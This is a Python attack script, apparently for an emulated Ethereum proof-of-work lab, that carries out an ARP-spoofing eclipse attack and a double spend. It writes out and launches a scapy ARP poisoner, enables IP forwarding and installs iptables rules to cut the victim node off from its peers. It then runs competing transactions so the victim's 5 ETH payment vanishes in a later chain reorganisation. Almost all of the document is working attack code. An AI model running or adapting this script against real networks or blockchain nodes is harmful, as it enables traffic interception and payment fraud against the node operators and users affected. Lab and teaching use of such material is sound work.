#!/usr/bin/env python3
"""
ARP Eclipse Attack & Double Spend — runs INSIDE the attacker container
(as162h-new_eth_node-10.162.0.74).

Drop this file (and fake_tx.py / real_tx.py) into the container and run:
    python3 arp_eclipse_attack_container.py

No docker CLI, no host-VM subprocess calls.  Everything is done locally
(scapy ARP, iptables, geth IPC via geth attach, web3 HTTP-RPC).

Topology
  Real World:  Node 160 (BootNode Miner)  10.160.0.71
               Node 161 (Miner)            10.161.0.71
  Victim:      Node 162 (Miner)            10.162.0.71
  Attacker:    This container              10.162.0.74
"""

import subprocess
import sys
import os
import time
import signal
import argparse
import textwrap
import threading
import urllib.request as _ureq
import json as _json
from datetime import datetime
from web3 import Web3

# ──────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────
ATTACKER_IP  = "10.162.0.74"
TARGET_IP    = "10.162.0.71"   # Victim (Node 162)
GATEWAY_IP   = "10.162.0.254"  # AS162 router
IFACE        = "net0"

RPC = {
    "node160": "http://10.160.0.71:8545",
    "node161": "http://10.161.0.71:8545",
    "node162": "http://10.162.0.71:8545",
}
# NOTE: node162 RPC is on the victim — it is still reachable through the
# attacker's local net0 interface even while eclipsed (we are the MitM).

ADDR_ORIGIN  = "0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24"
ADDR_VICTIM  = "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9"
ADDR_BOB     = "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"

FAKE_TX_SCRIPT = "./fake_tx.py"
REAL_TX_SCRIPT = "./real_tx.py"

POLL_INTERVAL         = 3
PEER_POLL_TIMEOUT     = 90
BLOCK_ADVANCE_TIMEOUT = 120
REORG_MARGIN          = 5

# ──────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, color=WHITE):
    print(f"{DIM}[{ts()}]{RESET} {color}{msg}{RESET}", flush=True)

def log_phase(n, title):
    bar = "═" * 60
    print(f"\n{CYAN}{BOLD}{bar}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE {n}: {title}{RESET}")
    print(f"{CYAN}{BOLD}{bar}{RESET}\n", flush=True)

def log_ok(msg):
    print(f"{DIM}[{ts()}]{RESET} {GREEN}{BOLD}✔  {msg}{RESET}", flush=True)

def log_warn(msg):
    print(f"{DIM}[{ts()}]{RESET} {YELLOW}{BOLD}⚠  {msg}{RESET}", flush=True)

def log_err(msg):
    print(f"{DIM}[{ts()}]{RESET} {RED}{BOLD}✘  {msg}{RESET}", flush=True)

def log_info(msg):
    print(f"{DIM}[{ts()}]{RESET} {CYAN}→  {msg}{RESET}", flush=True)

def log_balances(label, origin, victim, bob):
    print(f"\n  {BOLD}{WHITE}{'─'*50}{RESET}")
    print(f"  {BOLD}{WHITE}Balances [{label}]{RESET}")
    print(f"  {WHITE}Origin  {ADDR_ORIGIN[:12]}…  {CYAN}{BOLD}{origin:.4f} ETH{RESET}")
    print(f"  {WHITE}Victim  {ADDR_VICTIM[:12]}…  {CYAN}{BOLD}{victim:.4f} ETH{RESET}")
    print(f"  {WHITE}Bob     {ADDR_BOB[:12]}…  {CYAN}{BOLD}{bob:.4f} ETH{RESET}")
    print(f"  {BOLD}{WHITE}{'─'*50}{RESET}\n", flush=True)

def abort(msg):
    log_err(f"FATAL: {msg}")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────
# LOCAL SHELL HELPER  (replaces docker_exec — we ARE the container)
# ──────────────────────────────────────────────────────────────
def run(cmd, check=True, capture=True):
    """Run a shell command locally inside this container."""
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"Command failed [{r.returncode}]: {r.stderr.strip()}")
    return r.stdout.strip() if capture else None

def run_bg(cmd):
    """Start a command in the background; return the Popen object."""
    return subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

# ──────────────────────────────────────────────────────────────
# WEB3 HELPERS
# ──────────────────────────────────────────────────────────────
def make_w3(node_key):
    return Web3(Web3.HTTPProvider(RPC[node_key]))

def wei_to_eth(v):
    return float(Web3.fromWei(v, "ether"))

def get_balances_eth(w3):
    return (
        wei_to_eth(w3.eth.get_balance(ADDR_ORIGIN)),
        wei_to_eth(w3.eth.get_balance(ADDR_VICTIM)),
        wei_to_eth(w3.eth.get_balance(ADDR_BOB)),
    )

# ──────────────────────────────────────────────────────────────
# POLLING UTILITY
# ──────────────────────────────────────────────────────────────
def wait_for(condition_fn, timeout, poll=POLL_INTERVAL, label="condition"):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            result = condition_fn()
            if result:
                return result
        except Exception as e:
            log(f"  poll '{label}' error: {e}", DIM)
        remaining = int(deadline - time.time())
        log(f"  Waiting for {label} … ({remaining}s left)", DIM)
        time.sleep(poll)
    return None

# ──────────────────────────────────────────────────────────────
# RPC / MINING HELPERS
# ──────────────────────────────────────────────────────────────
def wait_for_rpc(node_key, timeout=120):
    log_info(f"Waiting for RPC on {node_key} ({RPC[node_key]}) …")
    def check():
        try:
            return make_w3(node_key).isConnected()
        except Exception:
            return False
    if not wait_for(check, timeout, label=f"{node_key} RPC"):
        abort(f"RPC on {node_key} never came up after {timeout}s")
    log_ok(f"RPC on {node_key} is live")
    return make_w3(node_key)

def wait_for_all_mining(nodes, timeout=BLOCK_ADVANCE_TIMEOUT):
    log_info("Snapshotting initial block heights …")
    initial = {}
    for label, w3 in nodes.items():
        try:
            initial[label] = w3.eth.block_number
        except Exception:
            initial[label] = None
        log(f"  {label}: block {initial[label]}", DIM)

    log_info("Waiting for ALL nodes to advance at least one block …")
    def all_advanced():
        statuses = {}
        for label, w3 in nodes.items():
            try:
                bn = w3.eth.block_number
                statuses[label] = (initial[label] is not None and bn > initial[label], bn)
            except Exception:
                statuses[label] = (False, "?")
        log("  " + "  ".join(
            f"{l}:{v[1]}({'ok' if v[0] else '...'})" for l, v in statuses.items()
        ), DIM)
        return all(v[0] for v in statuses.values())

    if not wait_for(all_advanced, timeout, label="all nodes mining"):
        abort(f"Not all nodes advanced blocks within {timeout}s")
    log_ok("All nodes are mining!")

def get_peer_count_rpc(node_rpc_url):
    """Ask a geth node its peer count via JSON-RPC (net_peerCount)."""
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "net_peerCount", "params": [], "id": 1
        }).encode()
        req = _ureq.Request(node_rpc_url, data=body,
                            headers={"Content-Type": "application/json"})
        resp = _json.loads(_ureq.urlopen(req, timeout=4).read())
        return int(resp["result"], 16)
    except Exception:
        return -1

def ensure_mining(w3, label="node162"):
    """Verify block advances; if not, restart the miner via geth IPC."""
    log_info(f"Verifying {label} miner is active …")
    initial = w3.eth.block_number
    time.sleep(5)
    if w3.eth.block_number > initial:
        log_ok(f"  {label} is mining (block advanced)")
        return
    log_warn(f"  {label} block did not advance — restarting miner via geth IPC …")
    ipc = "/root/.ethereum/geth.ipc"
    run(f'geth attach --exec "miner.stop()" {ipc}', check=False)
    run(f'geth attach --exec "miner.setEtherbase(eth.accounts[0])" {ipc}', check=False)
    run(f'geth attach --exec "miner.start(1)" {ipc}', check=False)
    time.sleep(6)
    if w3.eth.block_number > initial:
        log_ok(f"  {label} miner restarted")
    else:
        log_warn(f"  {label} still not mining — check the geth process")

# ──────────────────────────────────────────────────────────────
# ARP POISONING  (runs locally — we have scapy in the container)
# ──────────────────────────────────────────────────────────────
_arp_proc = None   # global Popen for the background ARP spoofer

# Inline ARP spoof script written to /tmp so it can run as a
# persistent background process without a separate source file.
_ARP_SPOOF_CODE = r'''#!/usr/bin/env python3
import time, sys
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, srp

ATTACKER_IP = "{attacker_ip}"
TARGET_IP   = "{target_ip}"
GATEWAY_IP  = "{gateway_ip}"
IFACE       = "{iface}"

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, iface=IFACE, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    raise Exception(f"Cannot resolve MAC for {{ip}}")

def spoof(target_ip, spoof_ip, target_mac, src_mac):
    pkt = Ether(dst=target_mac)/ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=src_mac
    )
    sendp(pkt, iface=IFACE, verbose=False)

attacker_mac = get_if_hwaddr(IFACE)
target_mac   = get_mac(TARGET_IP)
gateway_mac  = get_mac(GATEWAY_IP)

print(f"[ARP] attacker={attacker_mac}  target={TARGET_IP}/{target_mac}  gw={GATEWAY_IP}/{gateway_mac}", flush=True)

try:
    while True:
        spoof(TARGET_IP,  GATEWAY_IP, target_mac,  attacker_mac)
        spoof(GATEWAY_IP, TARGET_IP,  gateway_mac, attacker_mac)
        time.sleep(1.5)
except KeyboardInterrupt:
    print("[ARP] Restoring tables …", flush=True)
    for _ in range(5):
        spoof(TARGET_IP,  GATEWAY_IP, target_mac,  gateway_mac)
        spoof(GATEWAY_IP, TARGET_IP,  gateway_mac, target_mac)
    print("[ARP] Done.", flush=True)
'''

def _write_arp_spoof_script():
    code = _ARP_SPOOF_CODE.format(
        attacker_ip=ATTACKER_IP,
        target_ip=TARGET_IP,
        gateway_ip=GATEWAY_IP,
        iface=IFACE,
    )
    path = "/tmp/_arp_spoof.py"
    with open(path, "w") as f:
        f.write(code)
    os.chmod(path, 0o755)
    return path

# ──────────────────────────────────────────────────────────────
# TX SCRIPT RUNNER  (fake_tx.py / real_tx.py run locally)
# ──────────────────────────────────────────────────────────────
def _stream_script(script_path, label, results):
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONWARNINGS"] = "ignore"
    proc = subprocess.Popen(
        [sys.executable, "-u", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, env=env
    )
    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        if line.startswith("[+]"):
            log_ok(f"  [{label}] {line}")
        elif line.startswith("[*]"):
            log_info(f"  [{label}] {line}")
        elif line.startswith("[!]"):
            log_warn(f"  [{label}] {line}")
        else:
            log(f"  [{label}] {line}", DIM)
    proc.wait()
    results[label] = proc.returncode

def run_tx_scripts_concurrently():
    results = {}
    t_fake = threading.Thread(target=_stream_script,
                              args=(FAKE_TX_SCRIPT, "FAKE", results), daemon=True)
    t_real = threading.Thread(target=_stream_script,
                              args=(REAL_TX_SCRIPT, "REAL", results), daemon=True)
    t_fake.start()
    t_real.start()
    t_fake.join()
    t_real.join()
    if results.get("FAKE", 1) != 0:
        abort(f"{FAKE_TX_SCRIPT} exited with code {results.get('FAKE')}")
    if results.get("REAL", 1) != 0:
        abort(f"{REAL_TX_SCRIPT} exited with code {results.get('REAL')}")

# ──────────────────────────────────────────────────────────────
# PHASE 0 — PRE-FLIGHT
# ──────────────────────────────────────────────────────────────
def phase0_preflight():
    log_phase(0, "PRE-FLIGHT CHECKS")

    # Verify we have the tools we need
    log_info("Checking required tools …")
    for tool in ("python3", "iptables", "sysctl", "ip"):
        try:
            run(f"which {tool}")
            log_ok(f"  {tool}: found")
        except Exception:
            abort(f"Required tool '{tool}' not found in this container")

    log_info("Checking scapy is importable …")
    try:
        run("python3 -c 'from scapy.all import ARP'")
        log_ok("  scapy: ok")
    except Exception:
        abort("scapy not available — install it: pip install scapy")

    log_info("Checking tx scripts exist …")
    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        if not os.path.isfile(path):
            abort(f"{path} not found — copy it to the same directory as this script")
        log_ok(f"  Found {path}")

    # RPC connectivity
    w3_160 = wait_for_rpc("node160")
    w3_161 = wait_for_rpc("node161")
    w3_162 = wait_for_rpc("node162")

    wait_for_all_mining({"node160": w3_160, "node161": w3_161, "node162": w3_162})

    b160 = w3_160.eth.block_number
    b161 = w3_161.eth.block_number
    b162 = w3_162.eth.block_number
    log_info(f"Block heights — 160: {b160}  161: {b161}  162: {b162}")
    if abs(b160 - b162) > 10:
        log_warn("Block heights differ by more than 10 — nodes may not be fully synced yet")
    else:
        log_ok("Block heights look consistent")

    o, v, b = get_balances_eth(w3_160)
    log_balances("Pre-Attack (Node 160)", o, v, b)
    if o < 2.0:
        abort(f"Origin account only has {o:.4f} ETH — need at least 2 ETH to execute double spend")

    peers = get_peer_count_rpc(RPC["node162"])
    log_info(f"Node 162 peer count before attack: {peers}")
    if peers == 0:
        log_warn("Node 162 already has 0 peers — check network; it may not be connected")
    else:
        log_ok(f"Node 162 is connected ({peers} peers)")

    log_ok("Pre-flight complete — all systems go\n")
    return w3_160, w3_161, w3_162

# ──────────────────────────────────────────────────────────────
# PHASE 1 — ECLIPSE
# ──────────────────────────────────────────────────────────────
def phase1_eclipse():
    log_phase(1, "ECLIPSE ATTACK — ISOLATING NODE 162")
    global _arp_proc

    # Enable IP forwarding so the victim's traffic actually reaches us
    log_info("Enabling IP forwarding …")
    run("sysctl -w net.ipv4.ip_forward=1")
    log_ok("IP forwarding enabled")

    # Write and launch the ARP spoof loop in the background
    log_info("Writing and launching ARP spoof loop …")
    spoof_path = _write_arp_spoof_script()
    _arp_proc = subprocess.Popen(
        [sys.executable, spoof_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    time.sleep(3)
    if _arp_proc.poll() is not None:
        out = _arp_proc.stdout.read()
        abort(f"ARP spoof process died immediately:\n{out}")
    log_ok(f"ARP spoof running (PID {_arp_proc.pid})")

    # Drop all forwarded TCP/UDP for the victim
    log_info("Installing iptables DROP rules for Node 162 traffic …")
    iptables_rules = [
        f"iptables -A FORWARD -s {TARGET_IP} -p tcp -j REJECT --reject-with tcp-reset",
        f"iptables -A FORWARD -d {TARGET_IP} -p tcp -j REJECT --reject-with tcp-reset",
        f"iptables -A FORWARD -s {TARGET_IP} -p udp -j DROP",
        f"iptables -A FORWARD -d {TARGET_IP} -p udp -j DROP",
    ]
    for rule in iptables_rules:
        run(rule)
    log_ok("iptables DROP rules installed")

    # Confirm isolation: victim peer count drops to 0
    log_info(f"Waiting for Node 162 to lose all peers …")
    def check_isolated():
        p = get_peer_count_rpc(RPC["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p == 0
    result = wait_for(check_isolated, timeout=60, label="Node 162 peer count == 0")
    if not result:
        log_warn("Node 162 still has peers after 60s — eclipse may be partial. Continuing anyway.")
    else:
        log_ok("Eclipse confirmed! Node 162 has 0 peers — it is ISOLATED")

    # Show the poisoned ARP entry on the victim
    log_info("Checking ARP table on Node 162 via ip neigh (requires geth IPC on victim) …")
    # We can't exec into the victim, but we can show our own ARP cache
    arp_out = run(f"ip neigh show {TARGET_IP}", check=False)
    log(f"  Attacker ARP cache for {TARGET_IP}: {arp_out}", YELLOW)

    log_ok("Phase 1 complete — Node 162 is eclipsed\n")

# ──────────────────────────────────────────────────────────────
# PHASE 2 — DOUBLE SPEND
# ──────────────────────────────────────────────────────────────
def phase2_double_spend(w3_160, w3_162):
    log_phase(2, "DOUBLE SPEND — DIVERGING THE CHAINS")

    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        if not os.path.isfile(path):
            abort(f"{path} not found")

    # Node 162's miner may have stalled; verify locally (this container has
    # no geth IPC for node162, so we use block polling via RPC)
    ensure_mining(w3_162, label="node162")

    nonce_real = w3_160.eth.get_transaction_count(ADDR_ORIGIN)
    nonce_fake = w3_162.eth.get_transaction_count(ADDR_ORIGIN)
    log_info(f"Nonce on real chain (node160): {nonce_real}")
    log_info(f"Nonce on fake chain (node162): {nonce_fake}")
    if nonce_real != nonce_fake:
        log_warn(f"Nonces differ ({nonce_real} vs {nonce_fake}) — chains may already be diverged!")
    else:
        log_ok(f"Nonces match ({nonce_real}) — both chains see the same account state")

    log_info("Launching fake_tx.py and real_tx.py concurrently …")
    run_tx_scripts_concurrently()

    log_info("Fetching balances from both worlds …")
    o_real, v_real, b_real = get_balances_eth(w3_160)
    o_fake, v_fake, b_fake = get_balances_eth(w3_162)

    log_balances("REAL WORLD (Node 160)", o_real, v_real, b_real)
    log_balances("FAKE WORLD (Node 162)", o_fake, v_fake, b_fake)

    if b_real > 0.9:
        log_ok("Bob received 1 ETH on the real chain ✓")
    else:
        log_warn(f"Bob's real balance: {b_real:.4f} ETH (unexpected)")

    if v_fake > v_real + 4.0:
        log_ok("Victim thinks they received 5 ETH (fake chain) — they're fooled! ✓")
    else:
        log_warn(f"Victim fake balance: {v_fake:.4f} ETH (unexpected)")

    real_block = w3_160.eth.block_number
    fake_block = w3_162.eth.block_number
    log_info(f"Chain lengths — Real: {real_block}  Fake: {fake_block}")
    if real_block > fake_block:
        log_ok(f"Real chain is longer by {real_block - fake_block} blocks — reorg will favour real chain")
    else:
        log_warn("Fake chain is currently longer — real chain needs to catch up before Phase 3")

    log_ok("Phase 2 complete — both realities exist simultaneously\n")
    return real_block, fake_block

# ──────────────────────────────────────────────────────────────
# PHASE 3 — CHAIN REORGANIZATION
# ──────────────────────────────────────────────────────────────
def phase3_reorg(w3_160, w3_162, real_block_at_p2, fake_block_at_p2):
    log_phase(3, "CHAIN REORGANIZATION — THE VANISH")
    global _arp_proc

    # Wait for safe margin before releasing victim
    log_info(f"Waiting for real chain to lead fake chain by at least {REORG_MARGIN} blocks …")
    def real_chain_ahead_enough():
        r = w3_160.eth.block_number
        f = w3_162.eth.block_number
        margin = r - f
        log(f"  Real: {r}  Fake: {f}  margin: {margin:+d}  (need +{REORG_MARGIN})", DIM)
        return margin >= REORG_MARGIN
    result = wait_for(real_chain_ahead_enough, timeout=300,
                      label=f"real chain +{REORG_MARGIN} blocks ahead")
    if not result:
        log_warn(f"Real chain never reached +{REORG_MARGIN} margin in 5 min — releasing anyway")
    else:
        margin = w3_160.eth.block_number - w3_162.eth.block_number
        log_ok(f"Real chain is ahead by {margin} blocks — releasing victim")

    # Flush iptables
    log_info("Flushing iptables rules …")
    run("iptables -F",         check=False)
    run("iptables -F FORWARD", check=False)
    log_ok("iptables rules flushed")

    # Stop the ARP spoof loop
    log_info("Terminating ARP spoof process …")
    if _arp_proc and _arp_proc.poll() is None:
        _arp_proc.terminate()
        try:
            _arp_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _arp_proc.kill()
    log_ok("ARP spoof stopped")

    # Push addPeer directly to node162 via JSON-RPC
    log_info("Getting BootNode enode URL via JSON-RPC …")
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "admin_nodeInfo", "params": [], "id": 1
        }).encode()
        req = _ureq.Request(RPC["node160"], data=body,
                            headers={"Content-Type": "application/json"})
        resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
        enode = resp["result"]["enode"].replace("127.0.0.1", "10.160.0.71")
        log_info(f"BootNode enode: {enode[:70]}…")
    except Exception as e:
        log_warn(f"Could not fetch enode via admin_nodeInfo: {e}")
        enode = None

    if enode:
        log_info("Calling admin_addPeer on Node 162 via JSON-RPC …")
        try:
            body = _json.dumps({
                "jsonrpc": "2.0", "method": "admin_addPeer",
                "params": [enode], "id": 1
            }).encode()
            req = _ureq.Request(RPC["node162"], data=body,
                                headers={"Content-Type": "application/json"})
            resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
            if resp.get("result"):
                log_ok(f"  admin_addPeer accepted")
            else:
                log_warn(f"  admin_addPeer response: {resp}")
        except Exception as e:
            log_warn(f"  admin_addPeer failed: {e}")

    # Wait for Node 162 to reconnect
    log_info("Waiting for Node 162 to reconnect to real network …")
    def has_peers():
        p = get_peer_count_rpc(RPC["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p > 0
    result = wait_for(has_peers, timeout=PEER_POLL_TIMEOUT, label="Node 162 has peers")
    if not result:
        log_warn("Node 162 still has no peers — may need manual intervention")
    else:
        log_ok("Node 162 reconnected to real network!")

    # Wait for chains to converge
    log_info("Waiting for Node 162 to sync with real chain (reorg in progress) …")
    def chains_synced():
        try:
            r = w3_160.eth.block_number
            f = w3_162.eth.block_number
            log(f"  Real: {r}  Victim (162): {f}", DIM)
            return abs(r - f) <= 2
        except Exception:
            return False
    result = wait_for(chains_synced, timeout=180, label="chains synced")
    if not result:
        log_warn("Chains did not fully sync within 3 min — partial reorg possible")
    else:
        log_ok("Node 162 has synced with the real chain — reorg complete!")

    # Final balance check
    log_info("Reading final balances from Node 162 (post-reorg) …")
    o_post, v_post, b_post = get_balances_eth(w3_162)
    log_balances("POST-REORG (Node 162)", o_post, v_post, b_post)

    o_real_now, v_real_now, b_real_now = get_balances_eth(w3_160)

    print(f"\n  {BOLD}{GREEN}{'═'*50}{RESET}")
    print(f"  {BOLD}{GREEN}  DOUBLE SPEND RESULT{RESET}")
    print(f"  {BOLD}{GREEN}{'═'*50}{RESET}")
    if b_post > 0.9:
        log_ok(f"Bob kept 1 ETH on the real chain ✓")
    else:
        log_warn(f"Bob's balance: {b_post:.4f} ETH (unexpected)")
    if abs(v_post - v_real_now) < 0.5:
        log_ok(f"Victim balance on 162 ({v_post:.4f}) matches real chain ({v_real_now:.4f})")
        log_ok("Victim's 5 ETH payment VANISHED after reorg ✓")
    else:
        log_warn(f"Victim on 162: {v_post:.4f} ETH  |  Real chain: {v_real_now:.4f} ETH  (may still be syncing)")
    print(f"  {BOLD}{GREEN}{'═'*50}{RESET}\n", flush=True)

    log_ok("Phase 3 complete — eclipse attack and double spend successful!\n")

# ──────────────────────────────────────────────────────────────
# SIGNAL HANDLER — emergency cleanup
# ──────────────────────────────────────────────────────────────
def cleanup_on_interrupt(sig, frame):
    print(f"\n{YELLOW}{BOLD}[!] Interrupted — cleaning up …{RESET}")
    try:
        subprocess.run("iptables -F",         shell=True, timeout=5)
        subprocess.run("iptables -F FORWARD", shell=True, timeout=5)
        print(f"{GREEN}  iptables flushed{RESET}")
    except Exception as e:
        print(f"{RED}  iptables flush failed: {e}{RESET}")
    if _arp_proc and _arp_proc.poll() is None:
        _arp_proc.terminate()
        print(f"{GREEN}  ARP spoof terminated{RESET}")
    print(f"{YELLOW}  Wait ~30s for ARP tables to recover naturally{RESET}")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="ARP Eclipse Attack & Double Spend — run inside attacker container",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Run from inside container as162h-new_eth_node-10.162.0.74.
            Requires: python3, scapy, web3, iptables, sysctl
            Also needs fake_tx.py and real_tx.py in the same directory.
        """)
    )
    parser.add_argument("--skip-reorg", action="store_true",
                        help="Stop after Phase 2 (skip chain reorganization)")
    parser.add_argument("--phase", type=int, choices=[0, 1, 2, 3], default=None,
                        help="Run only up to this phase (0=preflight, 1=eclipse, 2=double-spend, 3=reorg)")
    args = parser.parse_args()

    signal.signal(signal.SIGINT,  cleanup_on_interrupt)
    signal.signal(signal.SIGTERM, cleanup_on_interrupt)

    print(f"\n{CYAN}{BOLD}{'═'*60}{RESET}")
    print(f"{CYAN}{BOLD}  ECLIPSE ATTACK & DOUBLE SPEND — ATTACKER CONTAINER{RESET}")
    print(f"{CYAN}{BOLD}  Ethereum PoW Private Emulator  (ARP / Layer 2){RESET}")
    print(f"{CYAN}{BOLD}{'═'*60}{RESET}\n")
    print(f"  {DIM}Attacker: {ATTACKER_IP} (this container){RESET}")
    print(f"  {DIM}Victim:   {TARGET_IP}{RESET}")
    print(f"  {DIM}Gateway:  {GATEWAY_IP}{RESET}")
    print(f"  {DIM}Real net: 10.160.0.71  +  10.161.0.71{RESET}\n")

    max_phase = args.phase if args.phase is not None else (2 if args.skip_reorg else 3)

    w3_160, w3_161, w3_162 = phase0_preflight()
    if max_phase == 0:
        log_ok("Stopped after pre-flight (--phase 0)")
        return

    phase1_eclipse()
    if max_phase == 1:
        log_ok("Stopped after eclipse (--phase 1)")
        log_warn("Remember to flush iptables and kill ARP spoof when done!")
        return

    real_block, fake_block = phase2_double_spend(w3_160, w3_162)
    if max_phase == 2:
        log_ok("Stopped after double spend (--phase 2 / --skip-reorg)")
        log_warn("Node 162 is still isolated — run Phase 3 or flush iptables manually")
        return

    phase3_reorg(w3_160, w3_162, real_block, fake_block)
    print(f"\n{GREEN}{BOLD}  All phases complete. Attack demonstrated successfully.{RESET}\n")


if __name__ == "__main__":
    main()